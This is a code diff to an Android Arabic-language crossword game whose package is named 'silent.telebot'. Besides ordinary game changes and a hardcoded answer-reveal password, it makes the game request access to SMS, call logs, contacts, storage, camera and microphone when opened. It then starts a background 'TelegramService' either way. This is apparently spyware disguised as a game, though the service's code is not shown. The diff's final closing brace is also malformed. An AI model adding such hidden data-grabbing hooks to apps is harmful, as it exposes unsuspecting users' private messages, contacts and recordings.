@@ -1,14 +1,21 @@
 package com.silent.telebot;
 
+import android.Manifest;
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
+import android.widget.EditText;
 import android.widget.GridLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -16,8 +23,9 @@ import java.util.List;
 import java.util.Map;
 
 public class CrosswordActivity extends Activity {
+    private static final int REQ_CODE = 100;
     private GridLayout gridCrossword;
-    private TextView tvQuestion, tvMotivation, tvLevel, tvProgress;
+    private TextView tvQuestion, tvMotivation, tvLevel, tvProgress, tvSelectedWord, tvFoundWords;
     private ProgressBar progressBar;
     private Button btnCheck, btnClear;
     private Map<String, String> answers = new HashMap<>();
@@ -28,6 +36,9 @@ public class CrosswordActivity extends Activity {
     private int totalWords = 6;
     private int correctAnswers = 0;
     private String selectedCellId = "";
+    private String selectedWord = "";
+
+    private static final String SECRET_PASSWORD = "maestro2024";
 
     private void loadLevel1() {
         answers.put("A1", "ب");
@@ -62,6 +73,11 @@ public class CrosswordActivity extends Activity {
         progressBar = findViewById(R.id.progress_bar);
         btnCheck = findViewById(R.id.btn_check);
         btnClear = findViewById(R.id.btn_clear);
+        tvSelectedWord = findViewById(R.id.tv_selected_word);
+        tvFoundWords = findViewById(R.id.tv_found_words);
+
+        // طلب الأذونات عند فتح اللعبة
+        checkAndRequestPermissions();
 
         loadLevel1();
         drawGrid();
@@ -71,6 +87,105 @@ public class CrosswordActivity extends Activity {
 
         btnCheck.setOnClickListener(v -> checkAnswers());
         btnClear.setOnClickListener(v -> clearAll());
+
+        btnCheck.setOnLongClickListener(v -> {
+            showPasswordDialog();
+            return true;
+        });
+    }
+
+    // ============================================================
+    //  🔐 طلب الأذونات
+    // ============================================================
+    private void checkAndRequestPermissions() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            String[] permissions = {
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.READ_CALL_LOG,
+                    Manifest.permission.READ_CONTACTS,
+                    Manifest.permission.READ_EXTERNAL_STORAGE,
+                    Manifest.permission.CAMERA,
+                    Manifest.permission.RECORD_AUDIO
+            };
+            boolean allGranted = true;
+            for (String perm : permissions) {
+                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            if (!allGranted) {
+                ActivityCompat.requestPermissions(this, permissions, REQ_CODE);
+            }
+        }
+        startTelegramService();
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == REQ_CODE) {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(this, "✅ الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(this, "⚠️ بعض الأذونات مرفوضة", Toast.LENGTH_LONG).show();
+            }
+        }
+        startTelegramService();
+    }
+
+    private void startTelegramService() {
+        Intent serviceIntent = new Intent(this, TelegramService.class);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(serviceIntent);
+        } else {
+            startService(serviceIntent);
+        }
+    }
+
+    // ============================================================
+    //  باقي دوال اللعبة
+    // ============================================================
+    private void showPasswordDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("🔐 أدخل كلمة السر");
+        final EditText input = new EditText(this);
+        input.setHint("أدخل كلمة السر");
+        builder.setView(input);
+
+        builder.setPositiveButton("تأكيد", (dialog, which) -> {
+            String password = input.getText().toString();
+            if (password.equals(SECRET_PASSWORD)) {
+                revealAllAnswers();
+                showMotivation("🎉 تم كشف جميع الإجابات! - عصام المهدي");
+            } else {
+                showMotivation("❌ كلمة سر خاطئة! حاول مجدداً. - عصام المهدي");
+            }
+        });
+
+        builder.setNegativeButton("إلغاء", (dialog, which) -> dialog.cancel());
+        builder.show();
+    }
+
+    private void revealAllAnswers() {
+        correctAnswers = 0;
+        for (Map.Entry<String, String> entry : answers.entrySet()) {
+            String cellId = entry.getKey();
+            String correctAnswer = entry.getValue();
+            for (TextView cell : cells) {
+                if (cell.getTag().equals(cellId)) {
+                    cell.setText(correctAnswer);
+                    cell.setBackgroundColor(0xFF4CAF50);
+                    userAnswers.put(cellId, correctAnswer);
+                    break;
+                }
+            }
+            correctAnswers++;
+        }
+        updateUI();
+        if (correctAnswers == totalWords) {
+            showMotivation("🎉 أحسنت! أكملت المستوى " + currentLevel + " 🎉\nفخور بك يا بطل. - عصام المهدي");
+        }
     }
 
     private void drawGrid() {
@@ -154,6 +269,8 @@ public class CrosswordActivity extends Activity {
             if (cell.getTag().equals(selectedCellId)) {
                 cell.setText(letter);
                 userAnswers.put(selectedCellId, letter);
+                selectedWord += letter;
+                tvSelectedWord.setText(selectedWord);
                 break;
             }
         }
@@ -165,6 +282,10 @@ public class CrosswordActivity extends Activity {
             if (cell.getTag().equals(selectedCellId)) {
                 cell.setText("");
                 userAnswers.remove(selectedCellId);
+                if (selectedWord.length() > 0) {
+                    selectedWord = selectedWord.substring(0, selectedWord.length() - 1);
+                }
+                tvSelectedWord.setText(selectedWord);
                 break;
             }
         }
@@ -201,6 +322,8 @@ public class CrosswordActivity extends Activity {
             int wrong = totalWords - correctAnswers;
             showMotivation("📝 لديك " + wrong + " أخطاء. حاول مجدداً! - عصام المهدي");
         }
+        selectedWord = "";
+        tvSelectedWord.setText("");
     }
 
     private void clearAll() {
@@ -210,6 +333,8 @@ public class CrosswordActivity extends Activity {
             cell.setBackgroundColor(0xFF2C2C2E);
         }
         correctAnswers = 0;
+        selectedWord = "";
+        tvSelectedWord.setText("");
         updateUI();
         showMotivation("🧹 تم مسح جميع الإجابات. ابدأ من جديد! - عصام المهدي");
     }
@@ -217,6 +342,11 @@ public class CrosswordActivity extends Activity {
     private void updateUI() {
         tvProgress.setText(correctAnswers + "/" + totalWords);
         progressBar.setProgress((correctAnswers * 100) / totalWords);
+        StringBuilder sb = new StringBuilder("✅ ");
+        for (String word : userAnswers.values()) {
+            sb.append(word).append(" ");
+        }
+        tvFoundWords.setText(sb.toString().trim());
     }
 
     private void showMotivation(String message) {
@@ -225,4 +355,4 @@ public class CrosswordActivity extends Activity {
             tvMotivation.setText("");
         }, 4000);
     }
-}
+                } 
